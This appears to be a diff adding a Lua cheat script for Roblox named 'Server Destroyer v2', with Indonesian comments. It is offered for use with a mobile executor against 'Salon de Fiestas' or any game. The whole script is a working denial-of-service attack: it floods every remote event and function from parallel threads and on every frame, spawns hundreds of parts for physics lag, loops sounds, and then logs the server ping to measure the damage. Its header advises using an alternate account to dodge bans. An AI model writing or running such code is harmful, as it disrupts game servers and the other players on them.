@@ -1,0 +1,175 @@
+--[[
+    SCRIPT: Server Destroyer v2 (Delta Mobile Optimized)
+    GAME: Salon de Fiestas / Universal
+    RISIKO: BAN PERMANEN - GUNAKAN AKUN CADANGAN!
+--]]
+
+-- Load Services
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local LocalPlayer = Players.LocalPlayer
+
+-- Fungsi untuk ngecek kalo karakter udah muncul
+repeat wait() until LocalPlayer.Character
+
+print("💀 SERVER DESTROYER AKTIF - GASKAN!")
+
+-- ===========================================
+-- METODE 1: REMOTE SPAM (PALING AMPUH)
+-- ===========================================
+-- Cari semua remote di game
+local function getAllRemotes(folder)
+    local remotes = {}
+    local function scan(obj)
+        for _, child in pairs(obj:GetChildren()) do
+            if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") or child:IsA("UnreliableRemoteEvent") then
+                table.insert(remotes, child)
+            else
+                scan(child)
+            end
+        end
+    end
+    scan(folder)
+    return remotes
+end
+
+-- Cari remote di beberapa lokasi umum
+local remoteLists = {
+    getAllRemotes(ReplicatedStorage),
+    getAllRemotes(Players),
+    getAllRemotes(game:GetService("Workspace"))
+}
+
+-- Gabungin semua remote
+local allRemotes = {}
+for _, list in pairs(remoteLists) do
+    for _, remote in pairs(list) do
+        table.insert(allRemotes, remote)
+    end
+end
+
+print("📡 Ditemukan " .. #allRemotes .. " remote buat dispam")
+
+-- ARGUMEN SPAM - coba berbagai kombinasi
+local spamArgs = {
+    {"spam", 0, true},
+    {""},
+    {0, false},
+    {{}},
+    {Vector3.new(0,0,0)},
+    {LocalPlayer, "spam"},
+    {game:GetService("HttpService"):GenerateGUID(false)} -- random string
+}
+
+-- Loop utama spam (pake spawn biar gak nge-freeze client)
+for i = 1, 10 do -- 10 thread parallel
+    spawn(function()
+        while true do
+            for _, remote in ipairs(allRemotes) do
+                if remote and remote.Parent then -- Cek kalo remote masih ada
+                    for _, args in ipairs(spamArgs) do
+                        pcall(function()
+                            if remote:IsA("RemoteEvent") then
+                                remote:FireServer(unpack(args))
+                            elseif remote:IsA("RemoteFunction") then
+                                -- InvokeServer dijalankan di coroutine biar gak nge-freeze
+                                coroutine.wrap(function()
+                                    remote:InvokeServer(unpack(args))
+                                end)()
+                            end
+                        end)
+                    end
+                end
+            end
+            wait() -- Jeda dikit biar client gak crash total
+        end
+    end)
+end
+
+-- ===========================================
+-- METODE 2: HIGH FREQUENCY HEARTBEAT
+-- ===========================================
+-- Pake RenderStepped buat frekuensi lebih tinggi (60x per detik)
+RunService.RenderStepped:Connect(function()
+    for _, remote in ipairs(allRemotes) do
+        if remote and remote.Parent then
+            pcall(function()
+                if remote:IsA("RemoteEvent") then
+                    remote:FireServer("heartbeat", math.random(), tick())
+                end
+            end)
+        end
+    end
+end)
+
+-- ===========================================
+-- METODE 3: INSTANCE SPAM (BUAT PHYSICS LAG)
+-- ===========================================
+-- Buat ribuan part kecil yang jatuh terus
+local function spamParts()
+    local partCount = 0
+    while partCount < 500 do
+        local part = Instance.new("Part")
+        part.Size = Vector3.new(1, 1, 1)
+        part.Position = LocalPlayer.Character.HumanoidRootPart.Position + Vector3.new(math.random(-50,50), 50, math.random(-50,50))
+        part.Velocity = Vector3.new(0, -50, 0)
+        part.Parent = workspace
+        part.Touched:Connect(function() end) -- Event dummy biar berat
+        
+        -- Hapus part kalo udah jatuh kebawah
+        game:GetService("Debris"):AddItem(part, 5)
+        
+        partCount = partCount + 1
+        if partCount % 50 == 0 then
+            wait()
+        end
+    end
+end
+
+-- Jalankan part spam di thread terpisah
+spawn(spamParts)
+spawn(spamParts)
+
+-- ===========================================
+-- METODE 4: SOUND SPAM (BUAT AUDIO LAG)
+-- ===========================================
+-- Buat sound object yang muter terus
+local function spamSound()
+    local sound = Instance.new("Sound")
+    sound.SoundId = "rbxassetid://9120387519" -- Sound dummy
+    sound.Looped = true
+    sound.Volume = 1
+    sound.Parent = workspace
+    
+    -- Play di banyak thread biar overload
+    for i = 1, 20 do
+        spawn(function()
+            while true do
+                pcall(function()
+                    sound:Play()
+                end)
+                wait(0.1)
+            end
+        end)
+    end
+end
+
+spawn(spamSound)
+
+-- ===========================================
+-- MONITOR DAMAGE (OPSIONAL)
+-- ===========================================
+-- Cek efeknya
+local pingStart = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
+print("📊 PING AWAL: " .. pingStart)
+
+spawn(function()
+    while true do
+        wait(5)
+        local pingNow = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
+        print("📈 PING SEKARANG: " .. pingNow)
+    end
+end)
+
+print("🔥 SERVER DESTROYER BERJALAN - SEMOGA BERHASIL!")
